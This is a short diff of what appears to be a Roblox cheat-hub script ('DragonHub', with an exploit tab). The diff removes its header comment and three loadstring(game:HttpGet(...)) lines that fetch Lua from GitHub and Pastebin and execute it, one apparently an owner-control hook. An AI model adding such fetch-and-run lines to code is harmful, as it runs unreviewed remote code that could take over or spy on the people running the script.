@@ -1,8 +1,3 @@
---[[
-	DragonHub Glassmorphic Dashboard UI (Mobile Responsive)
-	Place inside: StarterPlayer > StarterPlayerScripts (LocalScript)
-]]
-
 local DebugEnabled = true
 local function DebugPrint(stage, ...)
 	if DebugEnabled then
@@ -8797,10 +8792,6 @@ exploittab:Toggle("Anti AFK", function()
 		Duration = 3
 	})
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ghostofcelleron/Scripts/refs/heads/main/oldthingyep",true))()
-loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R",true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ghostofcelleron/Celeron/refs/heads/main/owner_anti_abuse_from_users"))()
 
 DebugPrint("Script setup complete")
 end, debug.traceback)
